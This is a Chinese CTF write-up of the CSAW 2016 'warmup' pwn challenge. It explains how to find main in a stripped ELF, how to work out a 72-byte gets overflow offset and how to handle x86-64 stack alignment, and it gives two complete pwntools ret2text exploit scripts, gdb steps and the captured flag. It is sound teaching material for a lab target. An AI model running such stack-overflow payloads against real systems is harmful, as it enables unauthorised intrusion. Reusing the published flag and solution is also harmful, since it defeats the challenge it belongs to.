---
title: "Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐"
date: 2026-11-05 10:00:00
updated: 2026-11-05 10:00:00
categories:
  - CTF
  - Pwn
  - 栈溢出
tags:
  - Pwn
  - 栈溢出
  - ret2text
  - pwntools
  - ROPgadget
  - pwndbg
  - CSAW2016
description: 从 stripped 的 ELF 入手，讲清楚 file / checksec 到底在看什么、没有符号表时怎么在 gdb 里定位 main、gets 写进 v5 时偏移为什么是 72 而不是 128+8，以及 64 位栈对齐的两种绕法：跳到 0x40060e 跳过 push rbp，或者用 ret gadget 再压一次栈。
difficulty: 入门
topic: Pwn 入门
series: Pwn 入门
series_order: 2
permalink: 2026/11/05/pwn-ctf-warmup-csaw-2016/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（跟着上一题 rip 做完，正好用来练工具）
- **考点**：stripped 二进制定位 `main`、`gets` 栈溢出、ret2text、64 位栈对齐
- **工具**：`file`、`checksec`、IDA、gdb + pwndbg、pwntools、ROPgadget
- **漏洞点**：`gets(v5)`，`v5` 在 `rbp-0x40`
- **偏移**：`0x40`（64 字节缓冲区）+ `8`（保存的 rbp）= `72`
- **后门**：`sub_40060D` → `system("cat flag.txt")`，地址 `0x40060d`
- **两种对齐方式**：跳 `0x40060e`（`+1` 跳过 `push rbp`），或先返回到 `ret` gadget `0x4004a1` 再跳 `0x40060d`
- **flag**：`CTF2{34eedba9-134b-4254-b7c0-f227836c1e48}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：C 语言函数调用、栈的基本概念、会用 gdb 和 pwntools（上一题 rip 里都讲过）
- **环境**：Linux（Kali / Ubuntu），IDA、gdb + pwndbg、pwntools、ROPgadget
- **靶场**：文中的地址是当时平台的临时环境，现在多半已经失效，请换成自己的靶场或本地环境
- 本文所有操作仅用于**授权靶场和教学**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`file 看类型` → `checksec 看保护` → `IDA 找 main` → `gdb 定位 main` → `算偏移` → `找后门` → `处理栈对齐` → `写 exp` → `拿 flag`
{% endnote %}

## 先从 file 开始

这道题能帮助你更好地熟悉 pwn 工具的使用。

下载文件后，先别急着运行，用 `file` 查看它到底是什么：

```bash
file pwn2
```

![file 查看文件类型](image.png)

*图 1：`file` 的输出，最后面那个 `stripped` 很关键*

输出大概是这样：

```text
pwn2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24,
BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped
```

逐段拆开看：

| 字段 | 含义 | 对做题的影响 |
| --- | --- | --- |
| `ELF 64-bit` | 64 位 Linux 可执行文件 | 地址占 8 字节，exp 里用 `p64` |
| `LSB` | 小端序（Least Significant Byte first） | 低字节放低地址，打包时不用手动反序 |
| `x86-64` | amd64 架构 | 参数用 `rdi` / `rsi` / `rdx` 传 |
| `dynamically linked` | 动态链接，运行时加载 libc | 函数会经过 PLT，后面可能要做 libc 泄露 |
| `interpreter /lib64/ld-linux-x86-64.so.2` | 动态链接器的路径 | 说明程序本身不包含 libc |
| `for GNU/Linux 2.6.24` | 目标内核版本很老 | 老题常见的“历史痕迹” |
| `stripped` | 符号表被去掉了 | **gdb 里不能直接 `disassemble main`** |

`file` 不是随便看看，它直接决定后面三件事：

1. 用 `p32` 还是 `p64`；
2. 是纯静态分析还是要考虑 libc；
3. 调试时能不能靠函数名下断点。

### stripped 到底去掉了什么

ELF 文件里有两张和“名字”有关的表：

| 表 | 内容 | `strip` 之后 |
| --- | --- | --- |
| `.symtab` | 完整的静态符号表，函数名、全局变量名、文件名都在这里 | **被删掉** |
| `.dynsym` | 动态链接需要的符号，比如 `gets`、`write`、`__libc_start_main` | 保留 |

所以 `stripped` 不是说函数没了，而是**函数还在，名字没了**。`main` 的代码好端端地躺在 `.text` 段里，只是没人告诉 gdb “这一块叫 main”。

你在 gdb 里敲：

```text
pwndbg> disassemble main
```

会得到类似：

```text
No symbol "main" in current context.
```

有的环境会提示 `No symbol table is loaded. Use the "file" command.`，意思都一样：**符号表里查不到 `main` 这个名字**。

{% note info %}
**函数名没了，地址和机器码不会没。** 反汇编的本质是“从某个地址开始，按 x86-64 指令格式把字节翻译成汇编”。只要你知道起始地址，gdb 照样能反汇编，IDA 也照样能分析。
{% endnote %}

## checksec 查看保护

再用 `checksec` 看这道题开了哪些保护，决定攻击路线：

```bash
checksec --file=pwn2
```

![checksec 查看保护](image-2.png)

*图 2：`checksec` 的输出；注意这里出现了两行 `Stack`*

```text
[*] '/home/kali/ctf/pwn2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

| 字段 | 本例 | 一句话解释 |
| --- | --- | --- |
| `Arch` | `amd64-64-little` | 64 位小端序，用 `p64` |
| `RELRO` | `Partial RELRO` | GOT 表只读了一部分，仍然可写 |
| `Stack`（第一行） | `No canary found` | 没有栈金丝雀，可以直接覆盖返回地址 |
| `NX` | `NX unknown - GNU_STACK missing` | 没有 `PT_GNU_STACK` 段，checksec 判断不出来 |
| `PIE` | `No PIE (0x400000)` | 程序基址固定，函数地址可以写死 |
| `Stack`（第二行） | `Executable` | 栈被标成可执行 |
| `RWX` | `Has RWX segments` | 存在同时可读可写可执行的段 |

这里有两行 `Stack`，新手很容易看懵：**第一行说的是 canary，第二行说的是栈的执行权限**，不是一回事。

### 为什么 NX 显示 unknown

NX（No-eXecute）依赖 ELF 里的 `PT_GNU_STACK` 程序头来标记栈的权限。现代编译器链接时都会自动生成这个段，但这是一道 2016 年的老题，`for GNU/Linux 2.6.24`，链接器没写这个段。

没有 `PT_GNU_STACK` 时，`checksec` 没法读出栈权限，只能写 `NX unknown`；而内核为了兼容老程序，默认会给出**可执行栈**，所以下面又标了 `Stack: Executable`。

这对我们其实无所谓，因为我们的做法是 **ret2text**：跳进程自己代码段里现成的函数，不需要往栈上放 shellcode。就算 NX 真开着，也照样能打。

### 其他保护对这道题意味着什么

- **`No canary found`**：栈上没有随机金丝雀挡路，溢出时可以一路写到返回地址。
- **`No PIE`**：程序加载基址固定为 `0x400000`。IDA 和 gdb 里看到的地址，在目标机器上就是同一个地址，exp 里可以写死常量。
- **`Partial RELRO`**：GOT 可写，但这题不涉及 GOT 劫持，先不用管。

{% note success %}
**看保护不是为了背名词，而是为了选路线。** canary 决定你能不能直接覆盖返回地址，PIE 决定地址能不能写死，NX 决定能不能执行栈上的 shellcode。这题 canary 没有、PIE 没开，最省事的路线就是 ret2text。
{% endnote %}

## 拉入 IDA 查看

把 `pwn2` 拖进 IDA，在左侧函数窗口找到 `main`，按 `F5`：

```c
int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[64];    // [rsp+0h] [rbp-80h] BYREF
  _BYTE v5[64];  // [rsp+40h] [rbp-40h] BYREF

  write(1, "-Warm Up-\n", 0xAuLL);
  write(1, "WOW:", 4uLL);
  sprintf(s, "%p\n", sub_40060D);
  write(1, s, 9uLL);
  write(1, ">", 1uLL);
  return gets(v5);
}
```

![IDA 中的 main](image-1.png)

*图 3：`main` 的伪代码，重点是最后那行 `gets(v5)`*

别看代码短，每一行都有信息量，我们一行一行看。

### 前两行：打招呼

```c
write(1, "-Warm Up-\n", 0xAuLL);
write(1, "WOW:", 4uLL);
```

`write(fd, buf, count)` 是系统调用封装：

| 参数 | 值 | 含义 |
| --- | --- | --- |
| `fd` | `1` | 标准输出 stdout |
| `buf` | `"-Warm Up-\n"` | 要输出的内容 |
| `count` | `0xA` | 输出 10 个字节，正好是字符串长度 |

第二行输出 `WOW:`，`4` 就是它的长度。这两行只是提示语，没有漏洞。

### 第三、四行：把后门地址打印出来

```c
sprintf(s, "%p\n", sub_40060D);
write(1, s, 9uLL);
```

这是整道题最“贴心”的地方。

`sprintf` 是变参函数，参数依次放在寄存器里：

| 寄存器 | 对应的参数 |
| --- | --- |
| `rdi` | 目标缓冲区 `s` |
| `rsi` | 格式串 `"%p\n"` |
| `rdx` | 第一个变参 `sub_40060D`（函数地址） |

`%p` 会把指针按 `0x` + 小写十六进制的形式打印出来。所以 `sprintf` 结束后，`s` 里存的是字符串 `"0x40060d\n"`。

然后 `write(1, s, 9)` 只输出 **9 个字节**：`0x40060d` 是 8 个字符，加上换行正好 9 个。这个 `9` 是写死的，说明作者连“地址长度固定为 9”都算好了。

运行时你会看到：

```text
WOW:0x40060d
```

{% note info %}
**这行 `WOW:` 就是官方给的提示。** 它直接把后门函数 `sub_40060D` 的地址印在你脸上。虽然这题是 No PIE，地址本来就固定，但这个泄露至少帮你确认了两件事：后门确实在 `0x40060d`，而且程序没有开 PIE。如果哪天遇到 PIE 的题，同样的写法就是白送的基址泄露——用 `io.recvuntil(b"WOW:")` 接住，再 `int(io.recvline(), 16)` 转成整数即可。
{% endnote %}

### 第五、六行：真正的漏洞

```c
write(1, ">", 1uLL);
return gets(v5);
```

先打印一个 `>` 当提示符，然后调用 `gets(v5)`。

`gets` 的语义是：**从标准输入读一整行，直到遇到换行或 EOF，把读到的内容写进 `v5`，不检查长度。** C11 标准已经把它删了，原因就是它没法防溢出。

`s[64]` 和 `v5[64]` 各占 64 字节，但 `gets` 拿到的是 `v5` 的地址。只要输入超过 64 字节，多出来的部分就会顺着栈往高地址写，依次覆盖：

```text
v5 后面 -> 保存的 rbp -> main 的返回地址 -> ...
```

`main` 最后执行 `leave; ret`，`ret` 会从栈上弹出返回地址并跳过去。**我们把这个返回地址改成后门的地址，程序就会乖乖去执行后门。** 这就是最简单的栈溢出利用。

## 没有符号表，怎么在 gdb 里看 main

IDA 的 `F5` 很直观，但做 pwn 不能只看伪代码，偏移和栈布局最好在 gdb 里亲眼确认一遍。

问题来了：这个可执行文件没有符号表，**不能直接用 `disassemble main`**。那怎么让 gdb 反汇编 `main`？

答案是：**先拿到 `main` 的起始地址，再让 gdb 从这个地址开始反汇编。** 地址从哪来？IDA 已经分析出来了。

### 从 IDA 拿地址

在 IDA 里定位 `main` 的起始地址，切到 Hex View，可以看到 `0x400610` 附近的机器码：

![IDA 中的机器码](image-3.png)

*图 4：`0x400610` 附近的机器码，`main` 的代码从 `0x40061d` 开始*

沿着地址找到 `main` 的入口，记下 **`0x40061d`**。

{% note info %}
**IDA 为什么能在 stripped 文件里认出 `main`？** 因为 IDA 不是靠符号表，而是做递归分析：它会找到 ELF 的入口点 `_start`，看 `_start` 怎么调用 `__libc_start_main`；`__libc_start_main` 的第一个参数就是 `main` 的地址。IDA 识别出这个模式后，就自动把那个函数标成 `main`。这是启发式分析，不是符号表。
{% endnote %}

### 在 gdb 里从地址反汇编

拿到地址后，直接让 gdb 从 `0x40061d` 开始，往下反汇编 30 条指令：

```text
pwndbg> x/30i 0x40061d
```

![gdb 从地址反汇编](image-4.png)

*图 5：`x/30i 0x40061d` 的输出，即使没有符号表也能正常反汇编*

这条命令拆开看：

| 部分 | 含义 |
| --- | --- |
| `x` | examine，查看内存 |
| `30` | 看 30 个单位 |
| `i` | 单位是“指令”（instruction），gdb 会顺带反汇编 |
| `0x40061d` | 起始地址 |

因为程序是 **No PIE**，`0x40061d` 在任何时候都是 `main` 的入口，可以放心写死。

把关键部分抄下来：

```asm
0x40061d: push rbp
0x40061e: mov  rbp, rsp
0x400621: add  rsp, 0xffffffffffffff80   ; 等价于 sub rsp, 0x80
0x400625: mov  edx, 0xa
0x40062a: mov  esi, 0x400741              ; "-Warm Up-\n"
0x40062f: mov  edi, 1
0x400634: call 0x4004c0 <write@plt>
0x400639: mov  edx, 4
0x40063e: mov  esi, 0x40074c              ; "WOW:"
0x400643: mov  edi, 1
0x400648: call 0x4004c0 <write@plt>
0x40064d: lea  rax, [rbp-0x80]            ; s
0x400651: mov  edx, 0x40060d              ; sub_40060D
0x400656: mov  esi, 0x400751              ; "%p\n"
0x40065b: mov  rdi, rax
0x40065e: mov  eax, 0
0x400663: call 0x400510 <sprintf@plt>
0x400668: lea  rax, [rbp-0x80]            ; s
0x40066c: mov  edx, 9
0x400671: mov  rsi, rax
0x400674: mov  edi, 1
0x400679: call 0x4004c0 <write@plt>
0x40067e: mov  edx, 1
0x400683: mov  esi, 0x400755              ; ">"
0x400688: mov  edi, 1
0x40068d: call 0x4004c0 <write@plt>
0x400692: lea  rax, [rbp-0x40]            ; v5
0x400696: mov  rdi, rax
0x400699: mov  eax, 0
0x40069e: call 0x400500 <gets@plt>
0x4006a3: leave
0x4006a4: ret
```

把它和伪代码对照着看，几件事一下就清楚了：

- `0x400621` 的 `add rsp, 0xffffffffffffff80` 其实是 `sub rsp, 0x80`。gdb 有时会把“减一个正数”显示成“加一个负数”，`0xffffffffffffff80` 是 `-0x80` 的补码。
- `s` 在 `rbp-0x80`（`0x40064d` 和 `0x400668` 的 `lea`）。
- `v5` 在 `rbp-0x40`（`0x400692` 的 `lea`）。
- `gets` 的参数是 `v5`，不是 `s`。

### 补充：不靠 IDA，从入口点找 main

IDA 只是其中一种方法。如果手头没有 IDA，或者想练纯 gdb 的流程，可以这样：

```text
pwndbg> starti
pwndbg> x/12i $pc
```

`starti` 会让程序停在第一条指令（ELF 入口点 `_start`），不需要任何符号。`_start` 最后会调用 `__libc_start_main`，而 `main` 的地址就在 `rdi` 里：

```text
pwndbg> b __libc_start_main
pwndbg> c
pwndbg> i r rdi
```

`__libc_start_main` 是动态导入的函数，名字在 `.dynsym` 里，所以这个断点能下。停下来后 `rdi` 的值就是 `main` 的地址。

不过说实话，有 IDA 的时候没必要绕这一圈。这里演示出来，是为了让你遇到“没有 IDA、符号又没了”的场合不至于卡住。

## 计算偏移：72 是怎么来的

回到伪代码里的注释：

```c
char s[64];    // [rsp+0h] [rbp-80h]
_BYTE v5[64];  // [rsp+40h] [rbp-40h]
```

`main` 开头 `sub rsp, 0x80`，给这个栈帧留了 **128 字节**：

- `s` 占低地址那 64 字节，从 `rbp-0x80` 到 `rbp-0x40`；
- `v5` 占高地址那 64 字节，从 `rbp-0x40` 到 `rbp`。

画成栈图：

```text
        高地址
        +--------------------------+
        |  main 的返回地址 (8)     |  <- rbp + 8
        +--------------------------+
        |  保存的 rbp (8)          |  <- rbp
        +--------------------------+
        |  v5[64]                  |  <- rbp - 0x40   gets 从这里开始写
        +--------------------------+
        |  s[64]                   |  <- rbp - 0x80
        +--------------------------+
        低地址
```

`gets` 从 `v5` 开始往**高地址**写，所以要先填满 `v5` 自己的 64 字节，再填掉保存的 `rbp` 的 8 字节，才能碰到返回地址：

```text
0x40（v5 到 rbp）+ 0x8（保存的 rbp）= 0x48 = 72
```

也就是说，前 **72 个字节是填充**，第 73 个字节开始才是返回地址。64 位地址占 8 字节，所以只覆盖返回地址需要 `72 + 8 = 80` 字节。

### 为什么不是 128 + 8

这是这道题最容易搞错的地方。**128 是整个栈帧的大小，不是 `gets` 的起点到返回地址的距离。**

- 整个栈帧是从 `rbp-0x80` 到 `rbp`，共 128 字节；
- 但 `gets` 的起点是 `v5`，也就是 `rbp-0x40`，它距离 `rbp` 只有 64 字节；
- `s` 在 `v5` 的**低地址方向**，`gets` 往高地址写，根本不会经过 `s`。

如果想“从 `s` 的底部开始算”，那得先往低地址写 64 字节才能走到 `s`，可 `gets` 只会往高地址增长，物理上做不到，也没必要。`s` 只是给 `sprintf` 用的临时缓冲区，和溢出无关。

{% note warning %}
**算偏移只看“被写入的缓冲区”到返回地址的距离，不要看整个栈帧。** 这题 `gets` 写的是 `v5`（`rbp-0x40`），所以是 `0x40 + 8 = 72`；如果写的是 `s`（`rbp-0x80`），才是 `0x80 + 8 = 136`。同一道题里两个缓冲区差了 64 字节，认错一个，payload 就全错。
{% endnote %}

### 在 gdb 里验证一下

光算不放心，可以下断点看一眼。在 `gets` 返回之后、`leave` 之前下断点：

```text
pwndbg> b *0x4006a3
pwndbg> r
```

程序会停在 `>` 提示符等你输入。输入 **72 个 A + 8 个 B**：

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
```

然后看 `rbp` 附近：

```text
pwndbg> x/2gx $rbp
```

应该看到：

```text
0x7fffffffe0d0: 0x4141414141414141  0x4242424242424242
```

- `[rbp]` 也就是保存的 rbp，被 72 个 A 的最后一组覆盖成了 `0x41...`；
- `[rbp+8]` 也就是返回地址，被 8 个 B 覆盖成了 `0x42...`。

再 `c` 一下，程序会跳到 `0x4242424242424242` 并段错误——**崩掉正好证明返回地址被我们控制了。**

## 寻找利用函数

下面寻找利用函数。IDA 的函数列表里有一个 `sub_40060D`：

![函数列表里的后门](image-5.png)

*图 6：`sub_40060D` 直接调用 `system("cat flag.txt")`*

双击进去按 `F5`：

```c
int sub_40060D()
{
  return system("cat flag.txt");
}
```

切到汇编视图：

![后门函数的汇编](image-6.png)

*图 7：`sub_40060D` 的汇编，入口地址 `0x40060d`*

```asm
sub_40060D proc near
push rbp
mov  rbp, rsp
mov  edi, offset command    ; "cat flag.txt"
call _system
pop  rbp
ret
sub_40060D endp
```

找到了，地址是 **`0x40060d`**。

这就是我们要跳的地方，利用方式叫 **ret2text**：返回到程序自身 `.text` 段里已有的代码，不需要注入新代码，也不需要泄露 libc。

{% note warning %}
**这里的后门不是 `system("/bin/sh")`，而是 `system("cat flag.txt")`。** 所以打进去之后不会出现 `$` 提示符，程序只会帮你把 flag 打印出来，然后继续往下走。别看到“没有 shell”就以为 exp 失败了。
{% endnote %}

## 开始写 exp

思路已经齐了：`72` 字节填充，然后把返回地址改成后门的地址。

不过这里有一个细节：**不能直接跳 `0x40060d`**，要先处理栈对齐。

### 先讲清楚栈对齐的原理

64 位 Linux 遵循 SysV AMD64 ABI，有一条硬性规定：

> **执行 `call` 指令的那一刻，`rsp` 必须 16 字节对齐（`rsp % 16 == 0`）。**

`call` 会把 8 字节返回地址压栈，所以在**被调函数刚进门时**，`rsp % 16 == 8`。函数序言再 `push rbp`，`rsp` 又回到 16 字节对齐，之后它自己再 `call` 别人时，就又是对齐的。

```text
调用方 rsp % 16 == 0
        call 压入返回地址
被调函数 rsp % 16 == 8
        push rbp
函数内部 rsp % 16 == 0
        call 下一个函数 ...
```

为什么非要 16 字节对齐？因为 libc 里大量使用 SSE 指令，比如 `movaps`、`movdqa`，这些指令要求操作数地址 16 字节对齐，不对齐会直接触发 **SIGSEGV**。`system`、`printf` 这类函数内部都有这样的指令。栈错位时，程序往往不是在 `system` 入口崩，而是在里面某条 `movaps` 上崩，看起来就像是“明明地址对了却打不通”。

### 我们的栈现在是什么状态

正常情况 `main` 是被 `call` 进来的，入口处 `rsp % 16 == 8`，`push rbp` 后变成 `0`，`sub rsp, 0x80` 还是 `0`。到函数结尾：

```text
leave        ; mov rsp, rbp; pop rbp  -> rsp % 16 == 8
ret          ; 弹出返回地址          -> rsp % 16 == 0
```

注意最后一步：**`ret` 弹出返回地址之后，`rsp % 16 == 0`**，这时才跳到我们写的地址。也就是说，我们的目标代码开始执行时，栈是“比正常函数入口少了 8 字节”的状态。

如果直接跳 `0x40060d`：

```text
ret 跳到 0x40060d：rsp % 16 == 0
push rbp：          rsp % 16 == 8
call system：       rsp % 16 == 8   ❌ 应该为 0
```

`call system` 时栈没对齐，`system` 一进门就是错位的，里面的 `movaps` 很容易崩。

如果跳 `0x40060e`（也就是 `0x40060d + 1`），跳过 `push rbp`：

```text
ret 跳到 0x40060e：rsp % 16 == 0
mov rbp, rsp：      rsp % 16 == 0
call system：       rsp % 16 == 0   ✅
```

这就对了。`mov rbp, rsp` 只是给 `rbp` 赋值，后面 `system` 不用 `rbp`，跳过 `push` 没有副作用。

### 方法一：跳过一条指令（+1）

之前演示过如何对齐栈的方法，用的是跳过一条指令的方式。先看之前的方式的 exp：

```python
from pwn import *

context.log_level = 'info'

HOST = '8ad40525ec3c9c8aeebca3d6.tcp-ctf2.dasctf.com'
PORT = 9999

BACKDOOR_ADDR = 0x40060e   # 0x40060d + 1，跳过 push rbp
PADDING = 72

io = remote(HOST, PORT, ssl=True, sni=HOST)
# io = process('./pwn2')

payload = b'A' * PADDING
payload += p64(BACKDOOR_ADDR)
log.info(f"Sending payload({len(payload)}bytes) -> backdoor @ {hex(BACKDOOR_ADDR)}")
io.sendline(payload)
io.interactive()
```

注释掉的那行是本地运行指令，如果需要本地运行可以换成它。

这个 exp 的 payload 是 `72 + 8 = 80` 字节：

```text
[ 72 字节填充 ][ 0x40060e ]
```

### 方法二：用 ret gadget 再压一次栈

今天我们用另一种方式来绕过：**先返回到一个只包含 `ret` 的 gadget，再返回到 `0x40060d`。**

一个 `ret` 指令做的事是从栈顶弹出 8 字节到 `rip`，同时 `rsp += 8`。所以：

- 第一个 `ret`（我们覆盖的返回地址）跳到 gadget；
- gadget 里的 `ret` 再弹一次栈，`rsp` 增加 8，对齐状态从 `0` 变成 `8`；
- 然后跳到 `0x40060d`，`push rbp` 后 `rsp % 16 == 0`，`call system` 时正好对齐。

```text
ret 跳到 gadget：  rsp % 16 == 0
gadget 的 ret：    rsp % 16 == 8
跳到 0x40060d：
push rbp：         rsp % 16 == 0
call system：      rsp % 16 == 0   ✅
```

和 `+1` 的效果完全一样，只是**用 8 字节的栈空间换了一次对齐**。

现在我们要找一个 gadget 函数为 `ret` 的函数，帮我们对齐栈，要用到 ROPgadget 的命令：

```bash
ROPgadget --binary ./pwn2 | grep ": ret"
```

![ROPgadget 找 ret gadget](image-7.png)

*图 8：找到了两个以 `ret` 结尾的 gadget*

```text
0x00000000004004a1 : ret
0x0000000000400595 : ret 0xc148
```

`ROPgadget` 会扫描程序的可执行段，把所有“以 `ret` 结尾的短指令序列”列出来，这些序列就叫 **gadget**。这里我们只需要一个干干净净的 `ret`：

- `0x4004a1 : ret` 只有一条 `ret`，正好用来消耗 8 字节、调整对齐；
- `0x400595 : ret 0xc148` 是 `ret` 之后又给 `rsp` 加了 `0xc148`，会把栈指针整个带走，不能用。

找到了地址就可以开始构造了：

```python
from pwn import *

context.log_level = 'info'

HOST = '8ad40525ec3c9c8aeebca3d6.tcp-ctf2.dasctf.com'
PORT = 9999

ret_addr = 0x4004a1
BACKDOOR_ADDR = 0x40060d
PADDING = 72

io = remote(HOST, PORT, ssl=True, sni=HOST)

# io = process("./pwn2")

payload = b'A' * PADDING
payload += p64(ret_addr)
payload += p64(BACKDOOR_ADDR)
log.info(f"Sending payload({len(payload)}bytes) -> backdoor @ {hex(BACKDOOR_ADDR)}")
io.sendline(payload)
io.interactive()
```

payload 变成 `72 + 8 + 8 = 88` 字节：

```text
[ 72 字节填充 ][ ret gadget (8) ][ 0x40060d (8) ]
```

{% note success %}
**两种方法的取舍：**

- `+1` 更短、更直接，但要求目标函数的第一条指令正好是 `push rbp`，而且你愿意跳过函数序言；
- `ret` gadget 更通用：跳的是函数的**真实入口**，函数自己的 `push rbp` / `pop rbp` 是配平的，后续逻辑不会乱。在更长的 ROP 链里，“先来一个 `ret` 调对齐”是标准操作。

看到“地址明明对、一打就崩”，先想想栈对齐；看到“该不该 `+1`”，两种方法都可以试。
{% endnote %}

### 为什么要用 p64

`p64(0x40060d)` 把整数打包成 8 字节小端序：

```python
>>> from pwn import *
>>> p64(0x40060d)
b'\r\x06@\x00\x00\x00\x00\x00'
```

内存里是 `0d 06 40 00 00 00 00 00`，CPU 按小端读 8 字节，还原成 `0x40060d`。

有人会担心：地址里有 `\x00`，`gets` 会不会把它当成字符串结束？**不会。** `gets` 是按字节读到换行或 EOF，`\x00` 只是普通字节，不会被截断。`sendline` 在 payload 末尾补的 `\n` 才是 `gets` 停止的信号。

## 运行，拿 flag

保存成 `pay.py`（名字随意），运行：

```bash
python3 pay.py
```

![运行 exp](image-8.png)

*图 9：payload 发送成功，flag 直接被后门打印出来*

输出：

```text
[+] Opening connection to 8ad40525ec3c9c8aeebca3d6.tcp-ctf2.dasctf.com on port 9999: Done
[*] Sending payload(88bytes) -> backdoor @ 0x40060d
[*] Switching to interactive mode
-Warm Up-
WOW:0x40060d
>CTF2{34eedba9-134b-4254-b7c0-f227836c1e48}
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
```

一行一行解释：

| 输出 | 含义 |
| --- | --- |
| `Opening connection ... Done` | `remote` 连上靶机 |
| `Sending payload(88bytes)` | 72 填充 + 8 ret gadget + 8 后门地址 |
| `-Warm Up-` / `WOW:0x40060d` | 程序自己的提示和泄露，地址和预期一致 |
| `>CTF2{...}` | `>` 是提示符，紧接着就是后门执行的 `cat flag.txt` 输出 |
| `timeout: ... dumped core` | `cat` 结束后后门 `ret` 到垃圾地址，进程崩溃 |
| `Got EOF while reading in interactive` | 进程已退出，连接关闭，交互模式读到 EOF |

flag 是：

```text
CTF2{34eedba9-134b-4254-b7c0-f227836c1e48}
```

### 为什么最后是崩溃，不是 shell

后门是 `system("cat flag.txt")`，不是 `system("/bin/sh")`。它执行完 `cat` 就返回，接着执行 `pop rbp; ret`：

- `pop rbp` 从栈上读一个值（已经是我们写坏的垃圾）；
- `ret` 再弹一个值当返回地址，跳到不存在的地址；
- 于是 SIGSEGV，平台报 `dumped core`。

这是**预期行为**，不是 exp 写错了。flag 已经打印出来了，进程怎么死都无所谓。

如果后门是 `/bin/sh`，这里就会停在一个 `$` 提示符上，`interactive()` 也就真的能敲命令了。

{% note info %}
**`timeout: the monitored command dumped core` 不是 pwntools 的报错**，是靶场包装程序发现子进程崩溃后打印的。看到 flag 就不用管它。
{% endnote %}

## 新手常见问题

{% note info **Q1：为什么偏移是 72，而不是 128 + 8？** %}
`128` 是整个栈帧（`sub rsp, 0x80`）的大小，但 `gets` 写的起点是 `v5 = rbp-0x40`，不是栈帧底部。从 `v5` 到 `rbp` 是 `0x40 = 64` 字节，再加保存的 `rbp` 8 字节，所以是 72。`s` 在 `v5` 的低地址方向，不会被往高地址写的 `gets` 碰到。
{% endnote %}

{% note info **Q2：为什么不能直接跳 0x40060d？** %}
直接跳会执行 `push rbp`，把 `rsp` 再减 8，导致 `call system` 时 `rsp % 16 == 8`，不满足 SysV ABI 要求的 16 字节对齐。`system` 内部的 `movaps` 一遇到不对齐的地址就会崩。要么跳 `0x40060e` 跳过 `push rbp`，要么先返回到一个 `ret` gadget，让 `ret` 帮我们多弹 8 字节把对齐补回来。
{% endnote %}

{% note info **Q3：为什么两个 exp 一个用 0x40060e，一个用 0x40060d？** %}
`0x40060e` 是 `0x40060d + 1`，跳过了函数开头的 `push rbp`，所以不需要额外 gadget。第二种方法保留函数真实入口 `0x40060d`，但在它前面加了一个 `ret` gadget `0x4004a1`，用多一次的 `ret` 把栈对齐调回去。两条路最终 `call system` 时 `rsp % 16` 都是 0。
{% endnote %}

{% note info **Q4：文件是 stripped 的，为什么 IDA 里还能看到 main？** %}
`strip` 删除的是 `.symtab`，不是函数本身。IDA 会从 ELF 入口点 `_start` 开始递归分析，识别 `_start` 把哪个地址传给 `__libc_start_main`，那个地址就是 `main`。所以没有符号也能把 `main` 标出来。gdb 不做这套分析，所以才需要我们从 IDA 拿地址，或者自己从入口点找。
{% endnote %}

{% note info **Q5：为什么用 0x4004a1 的 ret，不用 0x400595 的 ret？** %}
`0x4004a1` 只有一条 `ret`，作用就是弹出 8 字节并跳转；`0x400595` 是 `ret 0xc148`，`ret` 之后还会把 `rsp` 加上 `0xc148`，栈指针会直接跑到别的地方，后面的地址就取不到了。
{% endnote %}

{% note info **Q6：p64 里的 \x00 会被 gets 截断吗？** %}
不会。`gets` 按字节读到换行或 EOF，`\x00` 只是普通字节。真正让 `gets` 停下的是 `sendline` 补的 `\n`。
{% endnote %}

{% note info **Q7：本地怎么调试这个 exp？** %}
把 `io = remote(...)` 换成 `io = process('./pwn2')` 就行。想在 gdb 里跑，可以用 `io = gdb.debug('./pwn2', 'b *0x4006a3')`。注意远程靶机是临时环境，过期失效很正常。
{% endnote %}

{% note info **Q8：远程连不上怎么办？** %}
这类 `*.tcp-ctf2.dasctf.com` 的地址走 TLS，必须写 `remote(HOST, PORT, ssl=True, sni=HOST)`；普通 `nc` 靶场直接 `remote(HOST, PORT)`，加了 `ssl=True` 反而连不上。先确认平台和端口，再怀疑 exp。
{% endnote %}

## 完整流程速查

| 步骤 | 目的 | 操作 |
| --- | --- | --- |
| 1 | 看文件类型 | `file pwn2`，注意 `stripped` |
| 2 | 看保护 | `checksec --file=pwn2`，确认 No canary、No PIE |
| 3 | 找 main | IDA 打开，`F5`，记下入口 `0x40061d` |
| 4 | 在 gdb 定位 main | `x/30i 0x40061d`（没有符号表也能反汇编） |
| 5 | 找漏洞 | `gets(v5)`，`v5` 在 `rbp-0x40` |
| 6 | 算偏移 | `0x40 + 8 = 72` |
| 7 | 找后门 | `sub_40060D` → `system("cat flag.txt")`，地址 `0x40060d` |
| 8 | 处理对齐 | 跳 `0x40060e`，或 `ret` gadget `0x4004a1` + `0x40060d` |
| 9 | 写 exp | `padding + p64(target)`（88 字节版本中间多一个 `p64(ret)`） |
| 10 | 跑 | `python3 pay.py`，等 flag 打印 |

## 小结

这道题本身很简单，但把 pwn 入门最常用的工具链完整走了一遍：

- **`file`**：判断位数、链接方式、有没有符号表，决定 `p32` / `p64` 和调试方式；
- **`checksec`**：看 canary、NX、PIE、RELRO，决定走哪条利用路线；
- **IDA**：即使 stripped 也能识别 `main`，还能顺手找到后门；
- **gdb**：没有符号表就用地址反汇编，偏移一定要亲眼验证；
- **偏移**：从 `gets` 实际写入的缓冲区算，不是从整个栈帧算；
- **栈对齐**：64 位下 `call` 前 `rsp % 16 == 0`，`+1` 跳过 `push rbp` 或者加一个 `ret` gadget，本质都是把对齐补回来；
